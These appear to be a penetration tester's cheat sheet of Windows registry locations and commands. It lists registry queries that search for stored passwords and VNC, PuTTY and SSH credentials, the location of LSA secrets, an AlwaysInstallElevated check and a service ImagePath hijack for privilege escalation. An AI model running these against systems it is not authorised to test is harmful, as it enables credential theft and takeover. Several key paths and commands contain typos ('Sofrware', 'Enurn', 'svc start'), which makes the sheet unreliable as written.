#### Search passwords in registry
`> reg query HKLM /f password /t REG_SZ /s`
`> reg query HKCU /f password /t REG_SZ /s`

###### hklm: OS information  
HKLM\Software\Microsoft\Windows NT\CurrentVersion  
  
###### hklm: product name  
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v  
ProductName  
  
###### hklm: date of install  
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v InstallDate  
  
###### hklm: registered owner  
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v RegisteredOwner  
  
###### hklm: system root  
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v SystemRoot  
  
###### hklm: time zone  
HKLM\System\CurrentControlSet\Control\TimeZoneInformation /v ActiveTimeBias  
  
###### hklm: mapped network drives  
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU  
  
###### hklm: mounted devices  
HKLM\Sjstern\MountedDevices  
  
###### hklm: USB devices  
HKLM\System\CurrentControlSet\Enurn\USBStor  
  
###### hklm: turn on IP forwarding  
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters -> IPEnableRouter = 1  
###### hklm: password keys: LSA secrets can contain VPN, autologon, other passwords  
HKEY_LOCAL_MACHINE\Security\Policy\Secrets  
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon \autoadminlogon  
  
###### hklm: audit policy  
HKLM\Security\Policy\PolAdTev  
  
###### hklm: kernel/user services  
HKLM\Software\Microsoft\Windows NT\CurrentControlSet\Services  
  
###### hklm: installed software on machine  
HKLM\Software  
  
###### hklm: installed software for user  
HKCU\Software  
  
###### hklm: recent documents  
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs  
  
###### hklm: recent user locations  
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisite dMRU & \OpenSaveMRU  
  
###### hklm: typed URLs  
HKCU\Software\Microsoft\Internet Explorer\TypedURLs  
  
###### hklm: MRU lists  
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU  
  
###### hklm: last registry key accessed  
HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\RegEdit /v LastKey  
  
###### hklm: startup locations  
HKLM\Software\Microsoft\CurrentVersion\Run & \Runonce  
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run  
HKCU\Software\Microsoft\Windows\CurrentVersion\Run & \Runonce  
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load & \Run

#registry #creds
`reg query HKCU\Sofrware\ORL\WinVNC3\Password`
`reg query HKCU\Sofrware\TightVNC\Server`
`reg query HKCU\Sofrware\SimonTatham\PuTTY\Sessions`
`reg query HKCU\Sofrware\OpenSSH\Agent\Keys`
`reg query HKLM /f password /t REG_SZ /s`
`reg query HKCU /f password /t REG_SZ /s`

#alwaysinstall
`reg query HKLM\Software\Policies\Microsoft\Windows\Installer`
_if AlwaysInstallElevated == 1
You can run MSI file with SYSTEM Priveleges_

#regsvc ACL
`reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f`
`svc start regsvc`

